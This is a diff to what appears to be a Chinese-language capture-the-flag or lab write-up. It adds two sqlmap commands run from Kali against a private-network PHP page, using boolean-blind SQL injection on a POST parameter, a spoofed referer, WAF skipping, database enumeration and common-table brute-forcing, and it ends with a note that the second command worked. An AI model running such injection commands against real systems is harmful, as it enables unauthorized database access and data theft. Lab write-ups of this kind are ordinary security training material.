@@ -403,3 +403,29 @@ back-end DBMS: MySQL (MariaDB fork)
 
 [*] ending @ 03:49:00 /2026-05-06/
 ```
+继续下一步总是跑不出来
+```bash
+──(kali㉿kali)-[~/tmp/what]
+└─$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+--technique=B \
+--dbs \
+--skip-waf \
+--threads=5 \
+--batch
+```
+最后
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+--technique=B \
+--no-cast \
+--common-tables \
+--batch
+```
+成功了
